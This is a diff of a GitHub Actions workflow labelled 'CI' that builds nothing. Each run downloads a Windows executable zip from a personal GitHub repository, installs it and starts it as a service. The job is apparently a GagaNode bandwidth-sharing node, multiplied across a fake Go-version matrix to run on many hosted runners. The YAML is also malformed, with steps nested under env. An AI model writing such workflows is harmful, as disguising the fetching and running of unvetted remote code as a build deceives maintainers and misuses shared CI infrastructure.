@@ -1,20 +1,31 @@
 name: CI
 
-on: [push, workflow_dispatch]
+on: [workflow_dispatch]
 
 jobs:
   build:
 
+    name: GagaNode
     runs-on: windows-latest
 
-    steps:
-    - name: Download
-      run: Invoke-WebRequest https://github.com/sahalfreelance/gakun/raw/main/app-windows-amd64.zip -OutFile app-windows-amd64.zip
-    - name: Extract
-      run: Expand-Archive app-windows-amd64.zip
-    - name: Install
-      run: .\app-windows-amd64\app.exe service install
-    - name: Install
-      run: .\app-windows-amd64\app.exe service start
-    - name: END
-      run: exit
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+      env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+        
+        steps:
+          - name: Download
+            run: Invoke-WebRequest https://github.com/sahalfreelance/gakun/raw/main/app-windows-amd64.zip -OutFile app-windows-amd64.zip
+          - name: Extract
+            run: Expand-Archive app-windows-amd64.zip
+          - name: Install
+            run: .\app-windows-amd64\app.exe service install
+          - name: Install
+            run: .\app-windows-amd64\app.exe service start
+          - name: END
+            run: exit
